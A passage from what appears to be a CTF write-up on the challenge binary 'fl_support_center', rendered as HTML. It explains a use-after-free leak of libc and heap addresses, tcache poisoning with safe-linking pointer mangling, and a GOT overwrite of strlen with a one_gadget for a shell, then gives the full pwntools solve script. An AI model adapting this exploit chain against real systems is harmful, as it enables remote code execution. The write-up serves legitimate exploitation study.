+<p>On the second iteration, the key already exists, and so will not need to be reallocated, leaving our freed <code>it-&gt;first</code> string in the tcache. Once the tcache is filled, we can use the main bug in <code>remove&#40;&#41;</code> to obtain an iterator where <code>it-&gt;second</code> is a free chunk lying in the unsorted or smallbins list. From there, the read-after-free at</p>
+<pre><code class="cpp hljs">std::cout &lt;&lt; <span class=hljs-string >&quot;Do you want to delete the sent message: &quot;</span> &lt;&lt; it-&gt;second
+&lt;&lt; <span class=hljs-string >&quot;(yes or no)&quot;</span> &lt;&lt; std::endl;</code></pre>
+<p>will leak both a libc address and a heap address.</p>
+<p>To exploit the write, we can use the main bug to obtain an invalidated iterator <code>it</code> where <code>it-&gt;second</code> is freed and lies in the tcache. Then we can use the write-after-free to poison the tcache and write to an arbitrary location.</p>
+<p>In practice, I found difficulty leveraging the write after the tcache was poisoned. This is because almost every function in the program will symmetrically call <code>malloc</code> on entry, and then <code>free</code> when variables fall out of scope, leaving almost no cases where a poisoned tcache chunk &#40;such as one pointing to <code>__malloc_hook</code> or <code>__free_hook</code>&#41; could be successfully malloced without also being freed in the same function and causing an abort. </p>
+<p>Luckily, I found that during the process of the program aborting, libc makes a call to <code>strlen</code> inside of <code>__libc_message</code>. Hence we can leverage our tcache poisoning to corrupt the GOT entry for <code>strlen</code>, and then hijack execution to point to a one gadget which will give us a shell. </p>
+<p>Below is the full solve script</p>
+<pre><code class="python hljs"><span class=hljs-comment >#!/usr/bin/env python3</span>
+<span class=hljs-comment ># -*- coding: utf-8 -*-</span>
+<span class=hljs-keyword >from</span> pwn <span class=hljs-keyword >import</span> *
+
+context.terminal = <span class=hljs-string >&quot;pwn-client.sh&quot;</span>
+context.log_level = <span class=hljs-string >&quot;debug&quot;</span>
+
+exe = context.binary = ELF(args.EXE <span class=hljs-keyword >or</span> <span class=hljs-string >&quot;fl_support_center_patched&quot;</span>)
+libc = exe.libc
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">start</span>(<span class=hljs-params >argv=[], *a, **kw</span>):
+    <span class=hljs-string >&quot;&quot;&quot;Start the exploit against the target.&quot;&quot;&quot;</span>
+    <span class=hljs-keyword >if</span> args.GDB:
+        <span class=hljs-keyword >return</span> gdb.debug([exe.path] + argv, api=<span class=hljs-literal >True</span>, gdbscript=gdbscript, *a, **kw)
+    <span class=hljs-keyword >elif</span> args.LOCAL:
+        <span class=hljs-keyword >return</span> process([exe.path] + argv, *a, **kw)
+    <span class=hljs-keyword >else</span>:
+        <span class=hljs-keyword >return</span> connect(args.HOST, args.PORT)
+
+
+gdbscript = <span class=hljs-string >&quot;&quot;&quot;
+tbreak main
+continue
+&quot;&quot;&quot;</span>.<span class=hljs-built_in >format</span>(
+    **<span class=hljs-built_in >locals</span>()
+)
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">close</span>(<span class=hljs-params >conn</span>):
+    conn.close()
+    <span class=hljs-keyword >if</span> <span class=hljs-built_in >hasattr</span>(conn, <span class=hljs-string >&quot;gdb&quot;</span>):
+        conn.gdb.quit()
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">add</span>(<span class=hljs-params >conn, name</span>):
+    conn.sendlineafter(<span class=hljs-string >b&quot;&gt; &quot;</span>, <span class=hljs-string >b&quot;1&quot;</span>)
+    conn.sendlineafter(<span class=hljs-string >b&quot;Name: &quot;</span>, name)
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">message</span>(<span class=hljs-params >conn, name, msg</span>):
+    conn.sendlineafter(<span class=hljs-string >b&quot;&gt; &quot;</span>, <span class=hljs-string >b&quot;2&quot;</span>)
+    conn.sendlineafter(<span class=hljs-string >b&quot;Name: &quot;</span>, name)
+    conn.sendlineafter(<span class=hljs-string >b&quot;Message: &quot;</span>, msg)
+    line = conn.recvline()
+    <span class=hljs-keyword >if</span> <span class=hljs-string >b&quot;delete the sent message&quot;</span> <span class=hljs-keyword >in</span> line:
+        conn.sendlineafter(<span class=hljs-string >b&quot;&gt; &quot;</span>, <span class=hljs-string >b&quot;yes&quot;</span>)
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">protect_ptr</span>(<span class=hljs-params >pos, ptr</span>):
+    <span class=hljs-keyword >return</span> (pos &gt;&gt; <span class=hljs-number >12</span>) ^ ptr
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">list_entries</span>(<span class=hljs-params >conn</span>):
+    conn.sendlineafter(<span class=hljs-string >b&quot;&gt; &quot;</span>, <span class=hljs-string >b&quot;3&quot;</span>)
+    conn.recvuntil(<span class=hljs-string >b&quot;----------------------------------------------&quot;</span>)
+    conn.recvuntil(<span class=hljs-string >b&quot;----------------------------------------------&quot;</span>)
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">remove</span>(<span class=hljs-params >
+    conn,
+    name,
+    yon=<span class=hljs-literal >None</span>,
+    report=<span class=hljs-literal >None</span>,
+    message=<span class=hljs-literal >None</span>,
+</span>):
+    conn.sendlineafter(<span class=hljs-string >b&quot;&gt; &quot;</span>, <span class=hljs-string >b&quot;4&quot;</span>)
+    conn.sendlineafter(<span class=hljs-string >b&quot;Name: &quot;</span>, name)
+    leak = <span class=hljs-literal >None</span>
+    <span class=hljs-keyword >if</span> <span class=hljs-keyword >not</span> report <span class=hljs-keyword >is</span> <span class=hljs-literal >None</span>:
+        conn.sendlineafter(<span class=hljs-string >b&quot;Report: &quot;</span>, report)
+    <span class=hljs-keyword >if</span> <span class=hljs-keyword >not</span> yon <span class=hljs-keyword >is</span> <span class=hljs-literal >None</span>:
+        conn.recvuntil(<span class=hljs-string >b&quot;Please let us know.\n&quot;</span>)
+        conn.recv(numb=<span class=hljs-built_in >len</span>(<span class=hljs-string >b&quot;Do you want to delete the send message: &quot;</span>))
+        leak = conn.recv(numb=<span class=hljs-number >16</span>)
+        conn.sendlineafter(<span class=hljs-string >b&quot;(yes or no)\n&gt; &quot;</span>, yon)
+    <span class=hljs-keyword >if</span> <span class=hljs-keyword >not</span> message <span class=hljs-keyword >is</span> <span class=hljs-literal >None</span>:
+        <span class=hljs-keyword >if</span> <span class=hljs-built_in >isinstance</span>(message, <span class=hljs-built_in >bytes</span>):
+            conn.sendlineafter(<span class=hljs-string >b&quot;Message: &quot;</span>, message)
+        <span class=hljs-keyword >else</span>:
+            conn.sendlineafter(<span class=hljs-string >b&quot;Message: &quot;</span>, message(leak))
+    <span class=hljs-keyword >return</span> leak
+
+
+SUPPORT_NAME = <span class=hljs-string >b&quot;FL*Support*Center@fl.support.center&quot;</span>
+
+
+<span class=hljs-keyword >def</span> <span class="hljs-title function_">solve</span>():
+    conn = start()
+    g = cyclic_gen(n=<span class=hljs-number >8</span>)
+
+    <span class=hljs-comment ># Prepare first victim of main bug</span>
+    name = g.get(<span class=hljs-built_in >len</span>(SUPPORT_NAME))
+    add(conn, name)
+    remove(conn, name)
+    add(conn, name)
+    message(conn, name, g.get(<span class=hljs-number >0xA0</span>))
+
+    <span class=hljs-comment ># Fill up tcache</span>
+    names = []
+    <span class=hljs-keyword >for</span> _ <span class=hljs-keyword >in</span> <span class=hljs-built_in >range</span>(<span class=hljs-number >9</span>):
+        names.append(g.get(<span class=hljs-number >0xA0</span>))
+        add(conn, names[-<span class=hljs-number >1</span>])
+    <span class=hljs-keyword >for</span> i <span class=hljs-keyword >in</span> <span class=hljs-built_in >range</span>(<span class=hljs-number >9</span>):
+        remove(conn, names[i])
+    <span class=hljs-keyword >for</span> i <span class=hljs-keyword >in</span> <span class=hljs-built_in >range</span>(<span class=hljs-number >9</span>):
+        add(conn, names[i])
+    <span class=hljs-keyword >for</span> i <span class=hljs-keyword >in</span> <span class=hljs-built_in >range</span>(<span class=hljs-number >8</span>):
+        remove(conn, names[i], report=g.get(<span class=hljs-number >1</span>))
+
+    <span class=hljs-comment ># Now use first victim to read libc and heap address</span>
+    leak = remove(conn, name, yon=<span class=hljs-string >b&quot;no&quot;</span>, report=SUPPORT_NAME)
+    heap_leak, libc_leak = u64(leak[:<span class=hljs-number >8</span>]), u64(leak[<span class=hljs-number >8</span>:])
+    libc.address = libc_leak - <span class=hljs-number >0x21ACE0</span>
+    exe.heap_base = heap_leak - <span class=hljs-number >0x14A20</span>
+    <span class=hljs-built_in >print</span>(<span class=hljs-string >&quot;LIBC LEAK&quot;</span>, <span class=hljs-built_in >hex</span>(libc_leak))
+    <span class=hljs-built_in >print</span>(<span class=hljs-string >&quot;HEAP LEAK&quot;</span>, <span class=hljs-built_in >hex</span>(heap_leak))
+    <span class=hljs-built_in >print</span>(<span class=hljs-string >&quot;LIBC BASE&quot;</span>, <span class=hljs-built_in >hex</span>(libc.address))
+    <span class=hljs-built_in >print</span>(<span class=hljs-string >&quot;HEAP BASE&quot;</span>, <span class=hljs-built_in >hex</span>(exe.heap_base))
+
+    <span class=hljs-comment ># Prepare second victim</span>
+    name = g.get(<span class=hljs-built_in >len</span>(SUPPORT_NAME))
+    add(conn, name)
+    remove(conn, name)
+    add(conn, name)
+
+    <span class=hljs-comment ># Make sure the 0x40 tcache is non-empty</span>
+    tcache_fill = g.get(<span class=hljs-number >0x40</span>)
+    add(conn, tcache_fill)
+    remove(conn, tcache_fill)
+    add(conn, tcache_fill)
+
+    message(conn, name, g.get(<span class=hljs-number >0x40</span>))
+    remove(conn, tcache_fill, report=g.get(<span class=hljs-number >0x1</span>))
+
+    pos = exe.heap_base + <span class=hljs-number >0x13710</span>  <span class=hljs-comment ># Address of the chunk who&#x27;s fd pointer we&#x27;re corrupting</span>
+    remove(
+        conn,
+        name,
+        yon=<span class=hljs-string >b&quot;yes&quot;</span>,
+        report=SUPPORT_NAME,
+        message=fit(protect_ptr(pos, libc.address + <span class=hljs-number >0x21A090</span>), length=<span class=hljs-number >0x40</span>),
+    )
+
+    <span class=hljs-comment ># Overwrite GOT address with one gadget. Then trigger a free() abort.</span>
+    one_gadget = libc.address + <span class=hljs-number >0xEBD38</span>
+    add(conn, fit({<span class=hljs-number >0x8</span>: one_gadget}, length=<span class=hljs-number >0x40</span>))
+    add(conn, g.get(<span class=hljs-number >0x40</span>))
+    list_entries(conn)
+
+    <span class=hljs-keyword >return</span> conn
+
+
+<span class=hljs-keyword >if</span> __name__ == <span class=hljs-string >&quot;__main__&quot;</span>:
+    conn = solve()
+    conn.interactive()</code></pre>
+</div>
+        </div> 
+    </div> 
+    
+        
+
+
+
+    
+    
+        <script src="/wednesday/libs/highlight/highlight.min.js"></script>
+<script src="/wednesday/libs/highlight/rust.min.js"></script>
+<script src="/wednesday/libs/highlight/csharp.min.js"></script>
+<script>hljs.highlightAll();hljs.configure({tabReplace: '    '});</script>
